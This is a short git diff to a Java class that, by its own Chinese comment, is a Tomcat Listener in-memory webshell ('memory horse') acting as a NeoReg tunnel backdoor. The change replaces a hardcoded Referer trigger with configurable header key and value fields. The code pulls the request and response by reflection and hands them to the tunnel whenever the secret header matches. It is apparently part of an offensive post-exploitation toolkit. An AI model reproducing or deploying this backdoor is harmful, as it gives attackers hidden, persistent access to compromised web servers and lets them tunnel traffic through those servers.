@@ -16,11 +16,13 @@ import java.lang.reflect.Proxy;
 /**
  * 从线程添加 Tomcat Listener 内存马 - NeoReg 隧道脚本
  * <p>
- * Referer: https://su18.org/
- * <p>
  * python neoreg.py -k su18
  */
 public class TLNeoRegFromThread implements ServletRequestListener {
+
+	public static String HEADER_KEY;
+
+	public static String HEADER_VALUE;
 
 	static {
 		// 获取 standardContext
@@ -33,7 +35,6 @@ public class TLNeoRegFromThread implements ServletRequestListener {
 
 	@Override
 	public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
-
 	}
 
 
@@ -45,7 +46,7 @@ public class TLNeoRegFromThread implements ServletRequestListener {
 			field.setAccessible(true);
 			Request  request  = (Request) field.get(requestFacade);
 			Response response = request.getResponse();
-			if (request.getHeader("Referer").equalsIgnoreCase("https://su18.org/")) {
+			if (request.getHeader(HEADER_KEY).equalsIgnoreCase(HEADER_VALUE)) {
 				ServletContext application = request.getServletContext();
 				Object[] args = new Object[]{
 						request, //0
